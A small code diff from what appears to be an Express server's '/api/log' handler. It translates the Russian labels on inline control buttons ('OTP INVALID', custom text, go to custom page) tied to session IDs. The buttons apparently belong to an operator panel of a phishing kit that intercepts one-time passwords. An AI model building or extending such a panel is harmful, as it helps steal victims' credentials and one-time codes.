@@ -66,8 +66,8 @@ app.post('/api/log', (req, res) => {
                     { text: '❌ OTP INVALID', callback_data: `otp_invalid:${sessionId}` },
                 ],
                 [
-                    { text: '🔒 Задать кастомный текст', callback_data: `custom:${sessionId}` },
-                    { text: '➡️ Перейти на кастомную страницу', callback_data: `go_to_custom:${sessionId}` },
+                    { text: '✍️ Custom Text', callback_data: `custom:${sessionId}` },
+                    { text: '➡️ Custom', callback_data: `go_to_custom:${sessionId}` },
                 ],
             ],
         },
